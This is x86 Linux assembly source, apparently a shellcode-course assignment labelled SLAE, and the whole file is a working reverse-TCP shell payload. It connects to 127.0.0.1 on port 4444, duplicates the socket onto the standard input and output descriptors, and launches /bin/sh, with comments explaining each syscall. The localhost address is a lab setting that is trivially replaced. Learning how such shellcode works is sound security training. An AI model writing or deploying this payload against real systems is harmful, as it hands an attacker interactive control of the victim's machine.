; Author: Anubis
; SLAE

global _start




section .text
	_start:

	; set needed registers to zero

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx



	; Start of socket call

	mov bl, 2	; Setting AF_INET
	mov cl, 1	; Setting SOCK_STREAM
	mov dl, 6	; Setting protocol

	mov ax, 359	; syscall socket()

	int 0x80	; execute socket()


	; Start of connect call

	mov ebx, eax	; Putting sockfd socket value into ebx
	push 0x0101017f	; Setting address to connect to as "127.0.0.1" onto the stack
	push word 0x5c11	; Setting the port to connect to as "4444" onto the stack
	push word 2		; Setting "AF_INET" onto the stack
	
	mov ecx, esp	; Put the memory address of the top of the stack into ecx, which will contain all the parameters needed for the connect syscall

	mov dl, 16	; Size of the IP address, found running test.c

	mov ax, 362	; sycall connect()

	int 0x80	; execute connect()




	; Start of dup2 looping call

	xor ecx, ecx
	mov cl, 3	; Setting the counter to 3 (3 file descriptors as seen in Assignment 1)
	

	call_dup:
	
	xor eax, eax
	mov al, 63	; syscall dup2()
	dec ecx		; loop counter


	int 0x80	; execute dup2 each time

	inc ecx		; loop counter
	loop call_dup	; Actually loop


	; Start of execve call
	xor eax, eax
	xor edx, edx	
	push eax	; Zero out top of stack
	push 0x68732f2f	; Push the end of "/bin//sh"
	push 0x6e69622f	; Push the beginning of "/bin//sh"

	mov ebx, esp	; Put the pointer of "/bin//sh" on the stack into ebx

	mov al, 11	; sycall execve()

	int 0x80

